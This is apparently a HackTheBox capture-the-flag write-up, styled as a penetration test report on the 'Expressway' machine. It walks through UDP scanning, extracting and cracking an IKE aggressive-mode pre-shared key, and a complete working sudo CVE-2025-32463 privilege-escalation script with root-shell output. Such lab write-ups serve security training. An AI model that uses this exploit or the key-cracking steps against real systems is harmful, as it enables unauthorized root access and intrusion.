---
title: PENETRATION TESTING REPORT - EXPRESSWAY MACHINE
description: This write-up for the retired machine Expressway was completed while the machine was still active on the HackTheBox platform. Publication was held until after its official retirement to comply with platform guidelines.
author: ZoldyckSec
date: 2025-09-28 00:00:00 +0800
categories: [HackTheBox, Expressway]
tags: [CTF, UDP, IKE, Easy, PSK, CVE-2025-32463]
render_with_liquid: false
image:
  path: /assets/img/Expressway/Card-Express.png
---

## Description:

- `Date` Sep 27, 2025
- `Machine` Expressway (Linux)
- `Difficulty` Easy
- `Prepared by` Allan Espinoza(Aka.ZoldyckSec)

## 1.Reconnaissance Phase

After identifying only port 22/TCP (SSH) without valid credentials, I expanded reconnaissance to UDP services, which often host less secure configurations or sensitive information. Since the initial TCP scan only revealed the SSH service with no means of access, I proceeded to perform a UDP scan to identify additional services operating in connectionless protocols.

#### 1.1 🔍 UDP Enumeration 

```bash
nmap -sU --top-ports 100 -T4 -v -n --reason -oN UDP 10.10.11.87
```
- `-sU` **UDP Scan**. Sends UDP probes to ports and waits for either a response or an ICMP "port unreachable" message. UDP lacks a handshake, which is why it's typically slower and less accurate than TCP.

- `--top-ports` Scans **the top 100 most common UDP ports** according to the Nmap database (instead of 1-65535). Good for quick reconnaissance, but may miss services on non-standard ports.

- `-T4` **Timing Template**: Aggressive/Fast. Reduces timeouts and waits less for responses → faster scan but higher risk of **false negatives** and more network noise (detectable by IDS/IPS). Often reasonable for UDP, but if a firewall delays responses, prefer `-T3` or `-T4` with retries.

- `-v` **Verbosity**: More detailed console output. Shows progress and useful information. (You can use `-vv`/`-vvv` for more detail, but `-v` is usually sufficient.)

- `-n` **No DNS resolution**. Nmap will not attempt to resolve IP → hostname (faster, less DNS traffic).

- `--reason` Shows **why** Nmap classified a port (e.g., "ICMP port unreachable" → closed; "no response" → open|filtered). Very useful for interpreting UDP results.

#### Evidence 

```markdown
PORT      STATE         SERVICE         REASON
7/udp     closed        echo            port-unreach ttl 63
9/udp     closed        discard         port-unreach ttl 63
17/udp    open|filtered qotd            no-response
19/udp    closed        chargen         port-unreach ttl 63
49/udp    closed        tacacs          port-unreach ttl 63
53/udp    closed        domain          port-unreach ttl 63
67/udp    closed        dhcps           port-unreach ttl 63
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
80/udp    closed        http            port-unreach ttl 63
88/udp    closed        kerberos-sec    port-unreach ttl 63
111/udp   closed        rpcbind         port-unreach ttl 63
120/udp   closed        cfdptkt         port-unreach ttl 63
123/udp   closed        ntp             port-unreach ttl 63
135/udp   open|filtered msrpc           no-response
136/udp   closed        profile         port-unreach ttl 63
137/udp   closed        netbios-ns      port-unreach ttl 63
138/udp   open|filtered netbios-dgm     no-response
139/udp   closed        netbios-ssn     port-unreach ttl 63
158/udp   open|filtered pcmail-srv      no-response
161/udp   closed        snmp            port-unreach ttl 63
162/udp   closed        snmptrap        port-unreach ttl 63
177/udp   open|filtered xdmcp           no-response
427/udp   closed        svrloc          port-unreach ttl 63
443/udp   closed        https           port-unreach ttl 63
445/udp   closed        microsoft-ds    port-unreach ttl 63
497/udp   closed        retrospect      port-unreach ttl 63
500/udp   open          isakmp          udp-response ttl 63
514/udp   closed        syslog          port-unreach ttl 63
515/udp   closed        printer         port-unreach ttl 63
518/udp   closed        ntalk           port-unreach ttl 63
520/udp   closed        route           port-unreach ttl 63
593/udp   closed        http-rpc-epmap  port-unreach ttl 63
623/udp   closed        asf-rmcp        port-unreach ttl 63
626/udp   closed        serialnumberd   port-unreach ttl 63
631/udp   closed        ipp             port-unreach ttl 63
996/udp   closed        vsinet          port-unreach ttl 63
997/udp   closed        maitrd          port-unreach ttl 63
998/udp   closed        puparp          port-unreach ttl 63
999/udp   closed        applix          port-unreach ttl 63
1022/udp  open|filtered exp2            no-response
1023/udp  closed        unknown         port-unreach ttl 63
1025/udp  closed        blackjack       port-unreach ttl 63
1026/udp  closed        win-rpc         port-unreach ttl 63
1027/udp  open|filtered unknown         no-response
1028/udp  closed        ms-lsa          port-unreach ttl 63
1029/udp  closed        solid-mux       port-unreach ttl 63
1030/udp  closed        iad1            port-unreach ttl 63
1433/udp  closed        ms-sql-s        port-unreach ttl 63
1434/udp  closed        ms-sql-m        port-unreach ttl 63
1645/udp  closed        radius          port-unreach ttl 63
1646/udp  open|filtered radacct         no-response
1701/udp  closed        L2TP            port-unreach ttl 63
1718/udp  closed        h225gatedisc    port-unreach ttl 63
1719/udp  closed        h323gatestat    port-unreach ttl 63
1812/udp  closed        radius          port-unreach ttl 63
1813/udp  closed        radacct         port-unreach ttl 63
1900/udp  closed        upnp            port-unreach ttl 63
2000/udp  open|filtered cisco-sccp      no-response
2048/udp  closed        dls-monitor     port-unreach ttl 63
2049/udp  closed        nfs             port-unreach ttl 63
2222/udp  closed        msantipiracy    port-unreach ttl 63
2223/udp  open|filtered rockwell-csp2   no-response
3283/udp  closed        netassistant    port-unreach ttl 63
3456/udp  open|filtered IISrpc-or-vat   no-response
3703/udp  open|filtered adobeserver-3   no-response
4444/udp  closed        krb524          port-unreach ttl 63
4500/udp  open|filtered nat-t-ike       no-response
5000/udp  closed        upnp            port-unreach ttl 63
5060/udp  closed        sip             port-unreach ttl 63
5353/udp  closed        zeroconf        port-unreach ttl 63
5632/udp  closed        pcanywherestat  port-unreach ttl 63
9200/udp  closed        wap-wsp         port-unreach ttl 63
10000/udp closed        ndmp            port-unreach ttl 63
17185/udp closed        wdbrpc          port-unreach ttl 63
20031/udp open|filtered bakbonenetvault no-response
30718/udp closed        unknown         port-unreach ttl 63
31337/udp closed        BackOrifice     port-unreach ttl 63
32768/udp open|filtered omad            no-response
32769/udp closed        filenet-rpc     port-unreach ttl 63
32771/udp closed        sometimes-rpc6  port-unreach ttl 63
32815/udp closed        unknown         port-unreach ttl 63
33281/udp closed        unknown         port-unreach ttl 63
49152/udp closed        unknown         port-unreach ttl 63
49153/udp open|filtered unknown         no-response
49154/udp open|filtered unknown         no-response
49156/udp closed        unknown         port-unreach ttl 63
49181/udp closed        unknown         port-unreach ttl 63
49182/udp closed        unknown         port-unreach ttl 63
49185/udp closed        unknown         port-unreach ttl 63
49186/udp open|filtered unknown         no-response
49188/udp closed        unknown         port-unreach ttl 63
49190/udp closed        unknown         port-unreach ttl 63
49191/udp closed        unknown         port-unreach ttl 63
49192/udp closed        unknown         port-unreach ttl 63
49193/udp closed        unknown         port-unreach ttl 63
49194/udp closed        unknown         port-unreach ttl 63
49200/udp closed        unknown         port-unreach ttl 63
49201/udp closed        unknown         port-unreach ttl 63
65024/udp closed        unknown         port-unreach ttl 63
```
#### Hallazgo 
- Port 500 is primarily used by the Internet Key Exchange (IKE) protocol.
```
500/udp   open          isakmp          udp-response ttl 63
```

## 3. DETAILED FINDINGS

#### 3.1 Critical Finding 001: IKE/ISAKMP Service in Aggressive Mode

The IKE/ISAKMP service on UDP port 500 is configured in aggressive mode, allowing hash extraction for offline brute-force attacks.

#### Evidence

```bash
ike-scan -A 10.10.11.87 -P
````

```markdown
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
954d1bf7f7949d6216d26034fdededd2dfa91a603a4f2dba9e0a85e1fdce764ba7a868fc85a258472e6c91c905d21b180ca24a93886f0141712fe45862f2d8f54134741c0d2834355421f1d6b845fc58dbee643c0f6c6830a1f095b61c1fcc78e4db59e552db8e763d60f4fe624e24b35f770db5d5120af859985727395e1392:53bec0cd48ec92f2fe60df3751c080f8b6b92b45336312cd6d3c133bf2a5e93d10a30e9c444bd22249e8411d0ce7c3b6d22dbdbb2b0778fd68728aad84adb6dc2ab591fa105ccdcfd512637b76b9a052e0ed24565ce7bc3ba2c368a8b499a2ef4fd8212940256a1bce47db3a621bf582c592eaeb7a37ba519c6666b5a43c29d1:f77714c7d8fd7ed4:305b0ddf6f47d41c:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:679e4a6ac6afed51e8ec22d9f598937227a553ee:692fe7379ce6731b5a5659a3fd0a8ca8d50f05b88f936b5933fd7f8733df1bfd:ffe04d53c6ea615b98594efb211e3caed831a9e2
```

#### 3.2 High Finding 002: Weak Pre-Shared Key

An IKE hash was extracted from the aggressive mode service and successfully cracked via dictionary attack, revealing a weak PSK.

#### Evidence

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash
```

```markdown
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 54d97619cb37951c5be413903e6d6d2a78be31a7
```
#### 3.3 Critical Finding 003

Vulnerability CVE-2025-32463 was identified and exploited in the sudo configuration, which allowed full escalation of privileges without requiring prior enumeration of sudo permissions.

#### Evidence 

- `kh4sh3i/CVE-2025-32463`

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
````

```markdown
ike@expressway:~$ ./exploit.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# whoami
root
```







  
